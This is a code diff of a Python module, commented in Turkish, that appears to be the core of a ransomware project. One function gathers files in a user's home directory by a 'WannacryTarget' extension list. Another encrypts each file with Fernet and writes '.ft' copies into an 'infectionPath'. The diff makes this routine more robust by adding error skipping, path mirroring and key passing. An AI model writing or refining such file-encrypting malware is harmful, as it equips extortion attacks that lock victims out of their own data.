@@ -5,7 +5,6 @@ from cryptography.fernet import Fernet
 def GetTargets(homePath,WannacryTarget):
     matched_files = []
 
-    # Tüm klasör ve alt klasörleri dolaş
     for root, dirs, files in os.walk(homePath):
         for file in files:
             for ext in WannacryTarget:
@@ -14,29 +13,35 @@ def GetTargets(homePath,WannacryTarget):
                     matched_files.append(full_path)
     return matched_files
 
-
 def encrypted(files, infectionPath, silent, key):
-    #Şifreleme nesnesini oluştur
     cipher = Fernet(key)
-    
-    
-    for i in files:
-        with open(i, "rb") as f:
-            data = f.read()
+    for file_path in files:
+        try:
+            with open(file_path, "rb") as f:
+                data = f.read()
 
-        encrypted_data = cipher.encrypt(data)
-        encryptedFile = os.path.basename(i) + ".ft"
-        encrypted_path = os.path.join(infectionPath, encryptedFile)
+            encrypted_data = cipher.encrypt(data)
 
-        # Şifreli veriyi kaydet
-        with open(encrypted_path, "wb") as f:
-            f.write(encrypted_data)
-            if (silent):
-                print(f"{i} dosyası şifrelendi ve {encrypted_path} içine kaydedildi.")
+            relative_path = os.path.relpath(file_path, os.path.expanduser("~"))
+            
+            new_path = os.path.join(infectionPath, relative_path + ".ft")
 
+            os.makedirs(os.path.dirname(new_path), exist_ok=True)
 
-def start(homePath, silent, WannacryTarget, infectionPath):
+            with open(new_path, "wb") as f:
+                f.write(encrypted_data)
+
+            if not silent:
+                print(f"{file_path} şifrelendi → {new_path}")
+        except FileNotFoundError:
+            print(f"❌ {file_path} dosyası bulunamadı, atlanıyor.")
+            continue  # Dosya bulunamazsa hatayı atla ve bir sonraki dosyaya geç
+        except Exception as e:
+            print(f"❌ Hata: {str(e)}. {file_path} dosyası işlenemedi.")
+            continue  # Diğer hatalarla karşılaşırsak, işlemi atla ve devam et
+
+def start(homePath, silent, WannacryTarget, infectionPath, key):
     
     files = GetTargets(homePath, WannacryTarget)
-    encrypted(files, infectionPath, silent)
+    encrypted(files, infectionPath, silent, key)
 
